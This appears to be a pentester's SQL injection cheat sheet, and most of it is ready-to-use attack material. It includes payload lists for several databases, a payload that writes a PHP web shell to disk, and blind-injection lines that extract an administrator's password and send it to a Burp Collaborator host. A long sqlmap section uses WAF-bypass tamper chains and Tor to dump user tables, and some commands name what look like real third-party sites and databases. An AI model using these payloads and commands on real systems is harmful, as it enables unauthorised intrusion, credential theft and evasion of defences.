---
description: >-
  Mostly SQL injection vulnerabilities can be found using modern scanners.
  However, for more complex scenarios such as second-order SQLi, manual testing
  can also be used.
---

# SQLi

## Detection

The goal with many of these tests is to invoke some behaviour change in the application. Be sure to closely monitor for:

* [ ] Content-Length header changes
* [ ] Error messages
* [ ] Changes in the data returned
* [ ] Delays
* [ ] Second-order (i.e. you inject somewhere, but another interaction is required to trigger the payload)

#### Test cases:

* [ ] Test with single and double quotes
* [ ] Test with comments or terminators to mask the rest of the query
* [ ] Test with other special characters that can manipulate SQL statements
* [ ] Test with boolean conditions `and 1=1` and `and 1=2` (closely monitor the application response, in particular the Content-Length header)
* [ ] Test with functions that cause time delays
  * [ ] MySQL `sleep(5)`
  * [ ] PostgreSQL `pg_sleep(5)`
  * [ ] MS SQL Server `WAITFOR DELAY '0:0:05'`
  * [ ] Oracle `dbms_pipe.receive_message(('x'),5)`
* [ ] Test with out-of-band (OOB) or out-of-band application security testing (OAST) techniques
* [ ] Test for stacked queries
* [ ] Test for `UNION` keyword
  * [ ] `SELECT username,password FROM users UNION SELECT null,null`
  * [ ] Test for the number of columns using `null,null` or `ORDER BY 1` , `ORDER BY 2`
  * [ ] Test the data types with `'a',1` etc
* [ ] Test with different encoding techniques
* [ ] Test evasion techniques
  * [ ] Test with encoded payloads
  * [ ] Test with builting functions
    * [ ] E.g. `CHAR()`
  * [ ] Test ways to bypass commonly filtered characters
    * [ ] E.g. replacing space with `/**/`

#### Detection syntax

**General**

```
{payload}--
{payload};--
{payload}#
'||{payload}--
'||{payload}#
"{payload}--
"{payload}#
' AND {payload}--
' OR {payload}--
' AND EXISTS({payload})--
' OR EXISTS({payload})--
```

**MySQL**

```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'||{payload}--
"||{payload}--
'||(SELECT {payload})--
"||(SELECT {payload})--
```

**PostgeSQL**

```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
```

**Oracle**

```
' UNION ALL SELECT {payload} FROM dual--
' UNION SELECT {payload} FROM dual--
' OR (SELECT {payload} FROM dual) IS NOT NULL--
' OR (SELECT {payload} FROM dual) IS NULL--
'||({payload})--
'||{payload}||'--
"||{payload}||"--
'||(SELECT {payload} FROM dual)--
```

#### MSSQL

```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'+{payload}+
"+{payload}+
'+'+(SELECT {payload})+
"+"+(SELECT {payload})+
```

#### Other Payloads

```
OR {payload}=1
AND {payload}=1
AND IF({payload}, SLEEP(5), 1)
AND CASE WHEN {payload} THEN sleep(5) ELSE NULL END
AND {payload}
AND NOT {payload}
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('Error:',{payload},0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

#### Tools:

**SQLmap**

The easiest way to get started with SQLmap is to either save a request to a file or copy a request as curl and change the curl command to sqlmap.

<figure><img src="https://86304134-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F7lI1MQhaUuVEjnryWVD9%2Fuploads%2FpPGpQqWvSFx8k9WKoBYk%2Fsqli-copy-curl.png?alt=media&#x26;token=d980ee31-b7b2-4b4f-8b52-60851170b5d3" alt=""><figcaption><p>Copying a request as cURL</p></figcaption></figure>

```shellscript
# Original curl request
curl 'http://localhost/labs/i0x01.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' -H 'Connection: keep-alive' -H 'Referer: http://localhost/labs/i0x01.php' -H 'Cookie: csrf0x02=jeremy' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'username=jeremy'

# Update 'curl' to 'sqlmap' and optionally add sqlmap flags
sqlmap 'http://localhost/labs/i0x01.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' -H 'Connection: keep-alive' -H 'Referer: http://localhost/labs/i0x01.php' -H 'Cookie: csrf0x02=jeremy' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'username=jeremy'
```

## SQLi

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

{% embed url="https://sqlwiki.netspi.com/#mysql" %}

### Common

```shellscript
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
/?q=(1)or(0)=(1)

# Useful payloads
' WAITFOR DELAY '0:0:5'--
';WAITFOR DELAY '0:0:5'-- 
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
```

### Polyglot

```sql
', ",'),"), (),., * /, <! -, -
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

### Resources by type

```bash
# MySQL:
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

# MSQQL:
http://evilsql.com/main/page2.php
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

# ORACLE:
http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

# POSTGRESQL:
http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

# Others
http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
http://rails-sqli.org/
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
```

### R/W files

```bash
# Read file
UNION SELECT LOAD_FILE ("etc/passwd")-- 

# Write a file
UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
```

## Blind SQLi

#### Blind SQL Injection

Blind SQL injection (Blind SQLi) is a type of SQL injection attack where the attacker can exploit the database, but the application does not display the output. Instead, the attacker must "infer" data by sending payloads and observing the application's behavior or responses.

**A simple example:**

* A vulnearble webapp uses an API for its search to return the number of results found.
* A user searches for a product, and the application returns with "X products found" without displaying product details.
* The application uses the SQL query `SELECT COUNT(*) FROM products WHERE product_name LIKE '%{searchTerm}%'`.
* An attacker could exploit this by injecting SQL conditions into the `{searchTerm}`.
* For exmaple, searching for `laptop' AND 1=1-- -` returns "1 product found" and searching for `laptop' AND 1=2-- -` returns "0 products found", this behavior can be an indicator of a potential Blind SQLi vulnerability.

Blind SQLi is more time-consuming than regular SQLi but is just as dangerous. It can lead to:

* Sensitive data exposure
* Data manipulation
* Authentication bypass
* Potential discovery of hidden data

#### Other learning resources:

* OWASP: [https://owasp.org/www-community/attacks/Blind\\\\\_SQL\\\\\_Injection](https://owasp.org/www-community/attacks/Blind/_SQL/_Injection)
* SQLmap's guide on Blind SQLi: [http://sqlmap.org/](http://sqlmap.org/)
* PenTestMonkey's Cheat Sheet: [http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

#### Writeups:

#### Checklist:

* [ ] Identify potential vulnerable points:
  * [ ] URL parameters
  * [ ] Form fields
  * [ ] HTTP headers (e.g. cookies, user-agent)
  * [ ] Hidden fields
* [ ] Test for true/false conditions:
  * [ ] Can you get a "true" condition? E.g., `' AND 1=1-- -`
  * [ ] Can you get a "false" condition? E.g., `' AND 1=2-- -`
* [ ] Time-based Blind SQLi:
  * [ ] Introduce artificial delays using functions like `SLEEP()` or `BENCHMARK()`
  * [ ] Measure response times
* [ ] Error-based Blind SQLi:
  * [ ] Test a divide by zero payload
  * [ ] Can we trigger an error message?
    * [ ] Can we use `CAST()` to trigger an error and view the data?
* [ ] Content-based Blind SQLi:
  * [ ] Check for changes in page content based on payloads
* [ ] Out-of-band (OAST):
  * [ ] Can we trigger a DNS query?
  * [ ] Can we append some data to the subdomain of the URL to exfiltrate information?
* [ ] Binary search based extraction:
  * [ ] Exploit faster by dividing data and querying
* [ ] Backend specifics:
  * [ ] Are you dealing with MySQL, MSSQL, Oracle, PostgreSQL, SQLite?
  * [ ] Adjust your payloads accordingly
* [ ] Test with automated tools:
  * [ ] SQLmap with `--technique=B` flag
* [ ] Encoding and obfuscation:
  * [ ] Test with URL encoding, hex encoding, or other methods to bypass filters
* [ ] Bypassing filters:
  * [ ] Use comments, spaces, or alternative syntax
* [ ] Exploitation:
  * [ ] Extract database version, e.g., `AND (SELECT SUBSTRING(version(),1,1))='5'`
  * [ ] Fetch data character by character
  * [ ] Extract data from information\_schema

```bash
# Conditional Responses

# Request with:
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

    In the DDBB it does:
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' - If exists, show content or “Welcome back”

# To detect:
TrackingId=x'+OR+1=1-- OK
TrackingId=x'+OR+1=2-- KO
# User admin exist
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'-- OK
# Password length
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--

# So, in the cookie header if first letter of password is greater than ‘m’, or ‘t’ or equal to ‘s’ response will be ok.

xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
z'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,6,1)='§a§'--

# Force conditional responses

TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS ERROR IF OK
TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS NORMALLY IF KO
TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,3,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--;

# Time delays
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
TrackingId=x'; IF (1=2) WAITFOR DELAY '0:0:10'--
TrackingId=x'||pg_sleep(10)--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

# Out-of-Band OAST (Collaborator)
Asynchronous response

# Confirm:
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

# Exfil:
TrackingId=x'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## Second-order SQLi

#### Second-order SQL Injection

Second order SQL injection (also known as Stored SQL Injection) occurs when user input is first stored in the database, and later used without being validated or encoded. The injection opportunity occurs in the second operation, hence the name "second order".

**A simple example:**

* A vulnerable webapp allows users to save their usernames.
* An attacker can provide a malicious payload as their username, e.g. `jeremy'); DROP TABLE users;-- -`
* Later, when the application tries to fetch the username for an operation (e.g., greeting a returning user), it executes the malicious payload.

This type of attack can lead to:

1. Data loss or corruption.
2. Compromise of the database.
3. Sensitive data exposure.
4. Remote code execution.



#### Checklist:

```bash
# A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:
1. Firstly, we STORE a particular user-supplied input value in the DB and
2. Secondly, we use the stored value to exploit a vulnerability in a vulnerable function in the source code which constructs the dynamic query of the web application.

# Example payload:
X' UNION SELECT user(),version(),database(), 4 --
X' UNION SELECT 1,2,3,4 --

# For example, in a password reset query with user "User123' --":

$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123' — ' and password='UserPass@123'");

# Will be:

$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123'");

# So you don't need to know the password.

- User = ' or 'asd'='asd it will return always true
- User = admin'-- probably not check the password
```

### **sqlmap**

```bash
# Post
sqlmap -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - FORMS
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

# SQLMAP WAF bypass

sqlmap --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
sqlmap -v3 --technique=T --no-cast --fresh-queries --banner
sqlmap -u http://www.example.com/index?id=1 --level 2 --risk 3 --batch --dbs


sqlmap -f -b --current-user --current-db --is-dba --users --dbs
sqlmap --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
sqlmap --risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
sqlmap --random-agent --dbms=MYSQL --dbs --technique=B"
sqlmap --identify-waf --random-agent -v 3 --dbs

1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3

sqlmap --threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
sqlmap --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
sqlmap -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
sqlmap --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
sqlmap -v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu

sqlmap --wizard
sqlmap --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql

# Tamper suggester
https://github.com/m4ll0k/Atlas

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
# Tamper list
between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percent
```
